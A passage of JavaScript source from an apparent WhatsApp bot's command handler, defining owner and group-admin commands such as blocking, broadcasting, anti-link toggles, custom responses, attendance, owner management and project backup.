      if (!['on','off'].includes(v)) { await reply(`${prefix}autoviewstatus on/off`); break; }
      setWaSetting(waNum, 'autoViewStatus', v === 'on');
      await reply(`✅ Auto view status → ${v}`);
      break;
    }

    case 'autolikestatus': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}autolikestatus on/off`); break; }
      setWaSetting(waNum, 'autoLikeStatus', v === 'on');
      await reply(`✅ Auto like status → ${v}`);
      break;
    }

    case 'block': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await sock.updateBlockStatus(t, 'block');
      await reply(`✅ @${normNum(t)} blocked.`);
      break;
    }

    case 'unblock': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await sock.updateBlockStatus(t, 'unblock');
      await reply(`✅ @${normNum(t)} unblocked.`);
      break;
    }

    case 'listblocked': {
      if (needOwner()) break;
      try {
        const priv = await sock.fetchPrivacySettings();
        const blocklist = priv?.blockedContacts || [];
        if (!blocklist.length) { await reply('No blocked contacts.'); break; }
        await reply(`🚫 *Blocked (${blocklist.length}):*\n${blocklist.map(j => `• +${normNum(j)}`).join('\n')}`);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'broadcast': {
      if (needOwner()) break;
      const msg = args.join(' ');
      if (!msg) { await reply(`${prefix}broadcast <message>`); break; }
      try {
        const contacts = await sock.getContacts?.() || [];
        let sent = 0;
        for (const c2 of contacts) {
          if (!c2.id?.endsWith('@s.whatsapp.net')) continue;
          try { await sock.sendMessage(c2.id, { text: msg }); sent++; await new Promise(r => setTimeout(r, 300)); } catch {}
        }
        await reply(`✅ Broadcast sent to ${sent} contacts.`);
      } catch { await reply('❌ Broadcast failed.'); }
      break;
    }
    // ══════════════════════════════════════════════════════
//   GROUP – MISSING FROM SAMSUNG XMD (ENGLISH)
// ══════════════════════════════════════════════════════

// ── Anti-Video ──
case 'antivideo': {
  if (needGroup() || needAdmin()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`🎥 ${prefix}antivideo on/off\nDelete video messages automatically.`); break; }
  setGroupFlag('antivideo.json', jid, v === 'on');
  await reply(`✅ Anti-Video → ${v}`);
  break;
}

// ── Anti-Photo ──
case 'antiphoto':
case 'antifoto': {
  if (needGroup() || needAdmin()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`🖼️ ${prefix}antiphoto on/off\nDelete photo messages automatically.`); break; }
  setGroupFlag('antiphoto.json', jid, v === 'on');
  await reply(`✅ Anti-Photo → ${v}`);
  break;
}

// ── Anti-Status Mention ──
case 'antistatusmention':
case 'antitagsw': {
  if (needGroup() || needAdmin()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`🚫 ${prefix}antistatusmention on/off\nDelete messages that mention status updates.`); break; }
  setGroupFlag('antistatusmention.json', jid, v === 'on');
  await reply(`✅ Anti-Status-Mention → ${v}`);
  break;
}

// ── Anti-wa.me links ──
case 'antiwame': {
  if (needGroup() || needAdmin()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`🔗 ${prefix}antiwame on/off\nDelete wa.me links.`); break; }
  setGroupFlag('antiwame.json', jid, v === 'on');
  await reply(`✅ Anti-wa.me → ${v}`);
  break;
}

// ── Anti-WhatsApp Channel Links ──
case 'antilinkch': {
  if (needGroup() || needAdmin()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`📢 ${prefix}antilinkch on/off\nDelete WhatsApp channel links.`); break; }
  setGroupFlag('antilinkch.json', jid, v === 'on');
  await reply(`✅ Anti-Channel-Link → ${v}`);
  break;
}

// ── Anti-Instagram Links ──
case 'antilinkig': {
  if (needGroup() || needAdmin()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`📸 ${prefix}antilinkig on/off\nDelete Instagram links.`); break; }
  setGroupFlag('antilinkig.json', jid, v === 'on');
  await reply(`✅ Anti-Instagram-Link → ${v}`);
  break;
}

// ── Set Group Profile Picture ──
case 'setppgc':
case 'setgrouppic': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const { qMsg, qType, qKey } = getQuoted(m);
  const img = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
  if (!img) { await reply(`🖼️ ${prefix}setppgc (reply to an image)`); break; }
  try {
    const srcKey = m.message?.imageMessage ? m.key : qKey;
    const buf = await dlMedia({ imageMessage: img }, srcKey);
    await sock.updateProfilePicture(jid, buf);
    await reply('✅ Group profile picture updated.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Delete Group Profile Picture ──
case 'delppgc':
case 'delgrouppic': {
  if (needGroup() || needAdmin() || needBotAdm()) break;
  try {
    await sock.removeProfilePicture(jid);
    await reply('🗑️ Group profile picture removed.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Bad Words: Add ──
case 'addbadword': {
  if (needGroup() || needAdmin()) break;
  const word = args.join(' ').toLowerCase().trim();
  if (!word) { await reply(`⚠️ ${prefix}addbadword <word>\nExample: ${prefix}addbadword idiot`); break; }
  const badwordsFile = DB('badwords.json');
  const data = readJSON(badwordsFile, []);
  if (data.includes(word)) return reply(`⚠️ "${word}" already in the list.`);
  data.push(word);
  writeJSON(badwordsFile, data);
  await reply(`✅ Added "${word}" to bad words list.`);
  break;
}

// ── Bad Words: Delete ──
case 'delbadword': {
  if (needGroup() || needAdmin()) break;
  const word = args.join(' ').toLowerCase().trim();
  if (!word) { await reply(`⚠️ ${prefix}delbadword <word>\nExample: ${prefix}delbadword idiot`); break; }
  const badwordsFile = DB('badwords.json');
  let data = readJSON(badwordsFile, []);
  if (!data.includes(word)) return reply(`⚠️ "${word}" not found.`);
  data = data.filter(w => w !== word);
  writeJSON(badwordsFile, data);
  await reply(`🗑️ Removed "${word}" from bad words list.`);
  break;
}

// ── Bad Words: List ──
case 'listbadwords': {
  if (needGroup()) break;
  const badwordsFile = DB('badwords.json');
  const data = readJSON(badwordsFile, []);
  if (!data.length) return reply('📭 No bad words in the list.');
  await reply(`🚫 *Bad Words (${data.length})*\n${data.map((w, i) => `${i+1}. ${w}`).join('\n')}`);
  break;
}

// ── Custom Responses: List ──
case 'listresponse':
case 'list': {
  if (needGroup() || needAdmin()) break;
  const respFile = DB('responses.json');
  const data = readJSON(respFile, {});
  const groupResponses = Object.entries(data).filter(([key]) => key.startsWith(jid));
  if (!groupResponses.length) return reply('📭 No custom responses in this group.');
  let msg = '📋 *Custom Responses*\n\n';
  for (const [key, val] of groupResponses) {
    const cmd = key.replace(`${jid}|`, '');
    msg += `• ${cmd} → ${val.text || '(image)'}\n`;
  }
  await reply(msg);
  break;
}

// ── Custom Responses: Add ──
case 'addresponse':
case 'addlist': {
  if (needGroup() || needAdmin()) break;
  if (!text || !text.includes('|')) {
    await reply(`📝 ${prefix}addresponse <keyword> | <response>\nExample: ${prefix}addresponse hi | Hello there!\nTo add an image: reply to an image with the command.`);
    break;
  }
  const [keyword, response] = text.split('|').map(s => s.trim());
  if (!keyword || !response) return reply('❌ Invalid format.');
  const respFile = DB('responses.json');
  const data = readJSON(respFile, {});
  const key = `${jid}|${keyword.toLowerCase()}`;
  if (data[key]) return reply(`⚠️ "${keyword}" already exists. Use .updateresponse to change it.`);

  // Check if replying to an image
  const { qMsg, qType } = getQuoted(m);
  let imageUrl = null;
  if (qType === 'imageMessage') {
    try {
      const buf = await dlMedia({ imageMessage: qMsg.imageMessage }, m.key);
      const form = new FormData();
      form.append('fileToUpload', buf, 'image.jpg');
      form.append('reqtype', 'fileupload');
      const res = await axios.post('https://catbox.moe/user/api.php', form, {
        headers: form.getHeaders(),
        timeout: 15000,
      });
      imageUrl = res.data.trim();
    } catch {}
  }

  data[key] = { text: response, image: imageUrl };
  writeJSON(respFile, data);
  await reply(`✅ Response for "${keyword}" added.${imageUrl ? ' (with image)' : ''}`);
  break;
}

// ── Custom Responses: Delete ──
case 'delresponse':
case 'dellist': {
  if (needGroup() || needAdmin()) break;
  const keyword = args.join(' ').toLowerCase().trim();
  if (!keyword) { await reply(`⚠️ ${prefix}delresponse <keyword>\nExample: ${prefix}delresponse hi`); break; }
  const respFile = DB('responses.json');
  const data = readJSON(respFile, {});
  const key = `${jid}|${keyword}`;
  if (!data[key]) return reply(`⚠️ "${keyword}" not found.`);
  delete data[key];
  writeJSON(respFile, data);
  await reply(`🗑️ Removed response for "${keyword}".`);
  break;
}

// ── Custom Responses: Update ──
case 'updateresponse':
case 'updatelist': {
  if (needGroup() || needAdmin()) break;
  if (!text || !text.includes('|')) {
    await reply(`📝 ${prefix}updateresponse <keyword> | <new response>\nExample: ${prefix}updateresponse hi | Hey there!`);
    break;
  }
  const [keyword, response] = text.split('|').map(s => s.trim());
  if (!keyword || !response) return reply('❌ Invalid format.');
  const respFile = DB('responses.json');
  const data = readJSON(respFile, {});
  const key = `${jid}|${keyword.toLowerCase()}`;
  if (!data[key]) return reply(`⚠️ "${keyword}" not found.`);

  // Check if replying to an image
  const { qMsg, qType } = getQuoted(m);
  let imageUrl = data[key].image || null;
  if (qType === 'imageMessage') {
    try {
      const buf = await dlMedia({ imageMessage: qMsg.imageMessage }, m.key);
      const form = new FormData();
      form.append('fileToUpload', buf, 'image.jpg');
      form.append('reqtype', 'fileupload');
      const res = await axios.post('https://catbox.moe/user/api.php', form, {
        headers: form.getHeaders(),
        timeout: 15000,
      });
      imageUrl = res.data.trim();
    } catch {}
  }

  data[key] = { text: response, image: imageUrl };
  writeJSON(respFile, data);
  await reply(`✅ Response for "${keyword}" updated.${imageUrl ? ' (with image)' : ''}`);
  break;
}

// ── Attendance / Absen ──
case 'absen':
case 'attendance': {
  if (needGroup()) break;
  const absenFile = DB('absen.json');
  const data = readJSON(absenFile, {});
  const today = new Date().toISOString().slice(0, 10);
  const key = `${jid}|${today}`;
  if (!data[key]) data[key] = [];
  if (data[key].includes(sender)) return reply('✅ You already marked attendance today.');
  data[key].push(sender);
  writeJSON(absenFile, data);
  await reply(`✅ @${sender.split('@')[0]} marked attendance for today.`, { mentions: [sender] });
  break;
}

// ── List Attendance ──
case 'listabsen':
case 'listattendance': {
  if (needGroup()) break;
  const absenFile = DB('absen.json');
  const data = readJSON(absenFile, {});
  const today = new Date().toISOString().slice(0, 10);
  const key = `${jid}|${today}`;
  const list = data[key] || [];
  if (!list.length) return reply('📭 No one has marked attendance today.');
  const total = participants.length;
  const left = total - list.length;
  let msg = `📋 *Attendance (${today})*\n✅ Present: ${list.length}\n❌ Absent: ${left}\n\n`;
  list.forEach((u, i) => { msg += `${i+1}. @${u.split('@')[0]}\n`; });
  await reply(msg, { mentions: list });
  break;
}

// ── Send to Group (forward media/text to another group) ──
case 'sendtogroup':
case 'toswgc': {
  if (needGroup() || needAdmin()) break;
  if (!text || !text.includes('|')) {
    await reply(`📤 ${prefix}sendtogroup <group_jid> | <message>\nOr reply to media with: ${prefix}sendtogroup <group_jid>\nExample: ${prefix}sendtogroup 123456789@g.us | Hello everyone!`);
    break;
  }
  const [targetJid, ...rest] = text.split('|').map(s => s.trim());
  const caption = rest.join('|') || '';
  const { qMsg, qType, qKey } = getQuoted(m);

  try {
    if (qType === 'imageMessage') {
      const buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
      await sock.sendMessage(targetJid, { image: buf, caption });
    } else if (qType === 'videoMessage') {
      const buf = await dlMedia({ videoMessage: qMsg.videoMessage }, qKey);
      await sock.sendMessage(targetJid, { video: buf, caption });
    } else if (qType === 'audioMessage') {
      const buf = await dlMedia({ audioMessage: qMsg.audioMessage }, qKey);
      await sock.sendMessage(targetJid, { audio: buf, mimetype: 'audio/mpeg' });
    } else if (qType === 'stickerMessage') {
      const buf = await dlMedia({ stickerMessage: qMsg.stickerMessage }, qKey);
      await sock.sendMessage(targetJid, { sticker: buf });
    } else {
      await sock.sendMessage(targetJid, { text: caption || 'Message forwarded.' });
    }
    await reply(`✅ Sent to ${targetJid}.`);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Set Welcome Image ──
case 'setwelcomeimage': {
  if (needGroup() || needAdmin()) break;
  const { qMsg, qType, qKey } = getQuoted(m);
  const img = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
  if (!img) { await reply(`🖼️ ${prefix}setwelcomeimage (reply to an image)`); break; }
  try {
    const srcKey = m.message?.imageMessage ? m.key : qKey;
    const buf = await dlMedia({ imageMessage: img }, srcKey);
    const form = new FormData();
    form.append('fileToUpload', buf, 'welcome.jpg');
    form.append('reqtype', 'fileupload');
    const res = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders(),
      timeout: 15000,
    });
    const url = res.data.trim();
    const welcomeData = readJSON(DB('welcome_images.json'), {});
    welcomeData[jid] = url;
    writeJSON(DB('welcome_images.json'), welcomeData);
    await reply('✅ Welcome image set.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Set Goodbye Image ──
case 'setgoodbyeimage': {
  if (needGroup() || needAdmin()) break;
  const { qMsg, qType, qKey } = getQuoted(m);
  const img = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
  if (!img) { await reply(`🖼️ ${prefix}setgoodbyeimage (reply to an image)`); break; }
  try {
    const srcKey = m.message?.imageMessage ? m.key : qKey;
    const buf = await dlMedia({ imageMessage: img }, srcKey);
    const form = new FormData();
    form.append('fileToUpload', buf, 'goodbye.jpg');
    form.append('reqtype', 'fileupload');
    const res = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders(),
      timeout: 15000,
    });
    const url = res.data.trim();
    const goodbyeData = readJSON(DB('goodbye_images.json'), {});
    goodbyeData[jid] = url;
    writeJSON(DB('goodbye_images.json'), goodbyeData);
    await reply('✅ Goodbye image set.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Alias for existing commands (just in case) ──
case 'mutegc':
case 'mutegroup': {
  // Alias for 'mute' – redirect to existing case
  if (needGroup() || needAdmin() || needBotAdm()) break;
  await sock.groupSettingUpdate(jid, 'announcement');
  await reply('🔇 Group muted. Only admins can send messages.');
  break;
}

case 'setnamegc':
case 'setgroupname': {
  // Alias for 'setgname' – redirect to existing case
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const name = args.join(' ');
  if (!name) { await reply(`📝 ${prefix}setnamegc <new name>`); break; }
  await sock.groupUpdateSubject(jid, name);
  await reply(`✅ Group name changed to "${name}".`);
  break;
}

case 'setdescgc':
case 'setgroupdesc': {
  // Alias for 'setgdesc' – redirect to existing case
  if (needGroup() || needAdmin() || needBotAdm()) break;
  const desc = args.join(' ');
  if (!desc) { await reply(`📝 ${prefix}setdescgc <new description>`); break; }
  await sock.groupUpdateDescription(jid, desc);
  await reply('✅ Group description updated.');
  break;
}
// ══════════════════════════════════════════════════════
//   OWNER – MISSING FROM SAMSUNG XMD (ENGLISH)
// ══════════════════════════════════════════════════════

// ── Join Group via Link ──
case 'joingc':
case 'join': {
  if (needOwner()) break;
  const link = args[0];
  if (!link) { await reply(`🔗 ${prefix}join <group_link>\nExample: ${prefix}join https://chat.whatsapp.com/xxxxx`); break; }
  const code = link.split('chat.whatsapp.com/')[1]?.trim();
  if (!code) return reply('❌ Invalid group link.');
  try {
    await sock.groupAcceptInvite(code);
    await reply('✅ Successfully joined the group.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Add Owner ──
case 'addowner':
case 'addown': {
  if (needOwner()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply(`👑 ${prefix}addowner <@mention or number>`); break; }
  const ownerFile = DB('owner.json');
  const data = readJSON(ownerFile, []);
  if (data.includes(target)) return reply(`⚠️ @${target.split('@')[0]} is already an owner.`);
  data.push(target);
  writeJSON(ownerFile, data);
  await reply(`✅ @${target.split('@')[0]} added as owner.`, { mentions: [target] });
  break;
}

// ── Delete Owner ──
case 'delowner':
case 'delown': {
  if (needOwner()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply(`👑 ${prefix}delowner <@mention or number>`); break; }
  const ownerFile = DB('owner.json');
  let data = readJSON(ownerFile, []);
  if (!data.includes(target)) return reply(`⚠️ @${target.split('@')[0]} is not an owner.`);
  data = data.filter(j => j !== target);
  writeJSON(ownerFile, data);
  await reply(`🗑️ @${target.split('@')[0]} removed from owners.`, { mentions: [target] });
  break;
}

// ── List Owners ──
case 'listowner':
case 'listown': {
  if (needOwner()) break;
  const ownerFile = DB('owner.json');
  const data = readJSON(ownerFile, []);
  if (!data.length) return reply('📭 No additional owners.');
  let msg = '👑 *Owner List*\n\n';
  data.forEach((j, i) => { msg += `${i+1}. @${j.split('@')[0]}\n`; });
  await reply(msg, { mentions: data });
  break;
}

// ── Set Bot Profile Picture ──
case 'setbotpp':
case 'setppbot': {
  if (needOwner()) break;
  const { qMsg, qType, qKey } = getQuoted(m);
  const img = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
  if (!img) { await reply(`🖼️ ${prefix}setppbot (reply to an image)`); break; }
  try {
    const srcKey = m.message?.imageMessage ? m.key : qKey;
    const buf = await dlMedia({ imageMessage: img }, srcKey);
    await sock.updateProfilePicture(sock.user.id, buf);
    await reply('✅ Bot profile picture updated.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Delete Bot Profile Picture ──
case 'delppbot': {
  if (needOwner()) break;
  try {
    await sock.removeProfilePicture(sock.user.id);
    await reply('🗑️ Bot profile picture removed.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Set Bot Bio ──
case 'setbotbio':
case 'setbiobot': {
  if (needOwner()) break;
  const bio = args.join(' ');
  if (!bio) { await reply(`📝 ${prefix}setbiobot <new bio>`); break; }
  try {
    await sock.updateProfileStatus(bio);
    await reply('✅ Bot bio updated.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Auto Read ──
case 'autoread': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`📖 ${prefix}autoread on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.autoRead = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Auto-Read → ${v}`);
  break;
}

// ── Auto Typing ──
case 'autotyping': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`⌨️ ${prefix}autotyping on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.autoTyping = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Auto-Typing → ${v}`);
  break;
}

// ── Auto Bio ──
case 'autobio': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`📝 ${prefix}autobio on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.autoBio = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Auto-Bio → ${v}`);
  break;
}

// ── Only Group Chat ──
case 'onlygc': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`👥 ${prefix}onlygc on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.onlyGC = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Only-Group-Chat → ${v}`);
  break;
}

// ── Only Private Chat ──
case 'onlypc': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`💬 ${prefix}onlypc on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.onlyPC = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Only-Private-Chat → ${v}`);
  break;
}

// ── Only Admin (global, not group-specific) ──
case 'onlyadmin': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`🛡️ ${prefix}onlyadmin on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.onlyAdmin = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Only-Admin → ${v}`);
  break;
}

// ── Add Custom Case ──
case 'addcase': {
  if (needOwner()) break;
  if (!text || !text.includes('|')) {
    await reply(`📦 ${prefix}addcase <name> | <code>\nExample: ${prefix}addcase hello | reply('Hello world!')`);
    break;
  }
  const [name, code] = text.split('|').map(s => s.trim());
  if (!name || !code) return reply('❌ Invalid format.');
  const caseFile = DB('custom_cases.json');
  const data = readJSON(caseFile, {});
  if (data[name]) return reply(`⚠️ Case "${name}" already exists.`);
  data[name] = code;
  writeJSON(caseFile, data);
  await reply(`✅ Case "${name}" added.`);
  break;
}

// ── Delete Custom Case ──
case 'delcase': {
  if (needOwner()) break;
  const name = args[0];
  if (!name) { await reply(`🗑️ ${prefix}delcase <case_name>`); break; }
  const caseFile = DB('custom_cases.json');
  const data = readJSON(caseFile, {});
  if (!data[name]) return reply(`⚠️ Case "${name}" not found.`);
  delete data[name];
  writeJSON(caseFile, data);
  await reply(`🗑️ Case "${name}" deleted.`);
  break;
}

// ── List Custom Cases ──
case 'listcase': {
  if (needOwner()) break;
  const caseFile = DB('custom_cases.json');
  const data = readJSON(caseFile, {});
  const names = Object.keys(data);
  if (!names.length) return reply('📭 No custom cases.');
  await reply(`📋 *Custom Cases*\n${names.map((n, i) => `${i+1}. ${n}`).join('\n')}`);
  break;
}

// ── Get Custom Case Code ──
// ══════════════════════════════════════════════════════
//   GET CASE – Show code of any case (custom or built‑in)
// ══════════════════════════════════════════════════════
case 'getcase':
case 'gp':
case 'getplugin':
case 'getplugins': {
  if (needOwner()) break;
  const name = args[0];
  if (!name) {
    await reply(`📄 ${prefix}getcase <case_name>\nExample: ${prefix}getcase menu`);
    break;
  }

  // 1. Check custom cases first
  const caseFile = DB('custom_cases.json');
  const customData = readJSON(caseFile, {});
  if (customData[name]) {
    await reply(`📄 *Custom Case: ${name}*\n\`\`\`javascript\n${customData[name]}\n\`\`\``);
    break;
  }

  // 2. Search built‑in cases in case.js
  const caseJsPath = path.join(__dirname, 'case.js');
  if (!fs.existsSync(caseJsPath)) {
    await reply('❌ case.js file not found.');
    break;
  }

  const source = fs.readFileSync(caseJsPath, 'utf8');

  // Build a regex to find the case block
  // Match from "case 'name':" or "case \"name\":" until the next "case" or "break;" or "}"
  const regex = new RegExp(
    `case\\s*['"]${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}['"]\\s*:[\\s\\S]*?(?=\\n\\s*case\\s|\\n\\s*break;|\\n\\s*})`,
    'i'
  );
  const match = source.match(regex);

  if (!match) {
    await reply(`❌ Case "${name}" not found.`);
    break;
  }

  let code = match[0].trim();
  // Limit to 2000 characters to avoid huge messages
  let truncated = false;
  if (code.length > 2000) {
    code = code.slice(0, 2000) + '\n... (truncated)';
    truncated = true;
  }

  const msg = `📄 *Case: ${name}*\n\`\`\`javascript\n${code}\n\`\`\`${truncated ? '\n⚠️ Output truncated to 2000 characters.' : ''}`;
  await reply(msg);
  break;
}
/*case 'ntilink': {
  try {
    // Only respond to text commands
    if (!m.message?.conversation && !m.message?.extendedTextMessage?.text) break;

    // Build button message
    const status = global.antilink.enabled ? '🟢 ON' : '🔴 OFF';
    const contentText = `*ANTILINK SETTINGS*\n\n` +
                        `Current status: ${status}\n` +
                        `Action: ${global.antilink.action}\n` +
                        `Warn limit: ${global.antilink.warnCount}\n\n` +
                        `Press a button to toggle.`;

    // Load thumbnail (optional – reuse your menu.jpg or use a default)
    let thumbBuffer = null;
    try {
      thumbBuffer = await sharp('./src/img/menu.jpg')
        .resize(200, 200)
        .jpeg({ quality: 80 })
        .toBuffer();
    } catch (_) {}

    await sock.relayMessage(
      jid,
      {
        buttonsMessage: {
          locationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: 'Antilink Control',
            address: 'XHYPHER',
            jpegThumbnail: thumbBuffer,
          },
          contentText: contentText,
          footerText: `Antilink • ${status}`,
          buttons: [
            {
              buttonId: 'antilink_on',    // unique ID for ON button
              buttonText: { displayText: '✅ ON' },
              type: 1
            },
            {
              buttonId: 'antilink_off',   // unique ID for OFF button
              buttonText: { displayText: '❌ OFF' },
              type: 1
            }
          ],
          headerType: 6
        }
      },
      { quoted: m, messageId: Date.now().toString() }
    );
  } catch (err) {
    console.error('antilink command error:', err);
    await sock.sendMessage(jid, { text: '❌ Failed to send antilink menu.' }, { quoted: m });
  }
  break;
}*/
// ── Create Group ──
case 'creategc': {
  if (needOwner()) break;
  const name = args.join(' ');
  if (!name) { await reply(`📝 ${prefix}creategc <group_name>`); break; }
  try {
    const group = await sock.groupCreate(name, []);
    const code = await sock.groupInviteCode(group.id);
    await reply(`✅ Group created!\nName: ${group.subject}\nLink: https://chat.whatsapp.com/${code}`);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Backup Script ──
case 'backupsc': {
  if (needOwner()) break;
  await reply('⏳ Creating backup ZIP...');
  try {
    const exec = require('child_process').exec;
    const zipName = `backup_${Date.now()}.zip`;
    const exclude = 'node_modules .git .env Session sessions database sessions';
    await new Promise((res, rej) => {
      exec(`zip -r ${zipName} . -x ${exclude} 2>/dev/null`, (err) => err ? rej(err) : res());
    });
    const buf = fs.readFileSync(zipName);
    await sock.sendMessage(jid, { document: buf, fileName: zipName, mimetype: 'application/zip' });
    fs.unlinkSync(zipName);
    await reply('✅ Backup sent.');
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Send Chat to JID ──
case 'sendchat': {
  if (needOwner()) break;
  if (!text || !text.includes('|')) {
    await reply(`📤 ${prefix}sendchat <jid> | <message>`);
    break;
  }
  const [target, ...rest] = text.split('|').map(s => s.trim());
  const msgText = rest.join('|');
  if (!target || !msgText) return reply('❌ Invalid format.');
  try {
    await sock.sendMessage(target, { text: msgText });
    await reply(`✅ Sent to ${target}.`);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}
/*case 'almenu': {
  // ── Only run on text messages (prevents auto‑trigger from buttons, stickers, etc.) ──
  const msgType = m.message?.conversation ? 'conversation' :
                  m.message?.extendedTextMessage ? 'extendedTextMessage' : null;
  if (!msgType) break; // ignore non‑text

  // ── Optional: prevent triggering if the message is a button response ──
  if (m.message?.buttonsResponseMessage) break;

  await reaction('📋');

  // ── Gather status data ──
  const myName    = m.pushName || m.notifyName || 'Unknown';
  const myNumber  = m.sender ? m.sender.split('@')[0] : '0';
  const myStatus  = m.status || 'online';
  const botName   = c.botName || settings.BOT_NAME || 'SILENCER';
  const myUptime  = global.uptime ? formatUptime(global.uptime) : 'N/A';
  const myMode    = global.mode || 'public';
  const totalFitur = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
  const latensi   = global.latency || '0.0';
  const text      = m.body ? m.body.slice(m.body.indexOf(' ') + 1).trim() : '';

  // ── Build the fancy status panel ──
  let contentText = `•━═ 〘  𝐗𝐇𝐘𝐏𝐇𝐄𝐑   𝐏𝐑𝐎  〙═━•\n\n`;
  contentText += `> ╭═━⪩〘 𝑿𝑯𝒀𝑷𝑯𝑬𝑹 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐\n`;
  contentText += `> │⫹⫺ 𝗡𝗮𝗺𝗲        : ${myName}\n`;
  contentText += `> │⫹⫺ 𝗡𝘂𝗺𝗯𝗲𝗿      : ${myNumber}\n`;
  contentText += `> │⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀      : ${myStatus}\n`;
  contentText += `> │⫹⫺ 𝗟𝗶𝗺𝗶𝘁       : 0\n`;
  contentText += `> │⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲    : ${botName}\n`;
  contentText += `> │⫹⫺ 𝗨𝗽𝘁𝗶𝗺𝗲      : ${myUptime}\n`;
  contentText += `> │⫹⫺ 𝗠𝗼𝗱𝗲        : ${myMode}\n`;
  contentText += `> │⫹⫺ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀    : ${totalFitur} 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀\n`;
  contentText += `> │⫹⫺ 𝗨𝘀𝗲𝗿𝘀       : 0 𝘂𝘀𝗲𝗿𝘀\n`;
  contentText += `> │⫹⫺ 𝗦𝗽𝗲𝗲𝗱       : ${latensi}𝘀\n`;
  contentText += `> │⫹⫺ 𝗦𝗰𝗿𝗶𝗽𝘁      : ${global.name || 'silencer-md-bot'}\n`;
  contentText += `> │⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻     : ${global.version || '3.1.0'}\n`;
  contentText += `> │⫹⫺ 𝗕𝗮𝗶𝗹𝗲𝘆𝘀     : ${global.description || '@whiskeysockets/baileys'}\n`;
  contentText += `> │⫹⫺ 𝗠𝗮𝗶𝗻 𝗙𝗶𝗹𝗲  : ${global.main || 'index.js'}\n`;
  contentText += `> │⫹⫺ 𝗣𝗿𝗲𝗳𝗶𝘅      : 𝗠𝘂𝗹𝘁𝗶 𝗣𝗿𝗲𝗳𝗶𝗳\n`;
  if (text) contentText += `> │⫹⫺ ${ft(text, sock)}\n`;
  contentText += `> ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐`;

  // ── Load thumbnail from local file with sharp ──
  let thumbBuffer = null;
  try {
    const imagePath = './helper/menu.jpg'; // adjust to your actual path
    thumbBuffer = await sharp(imagePath)
      .resize(300, 300)
      .jpeg({ quality: 80 })
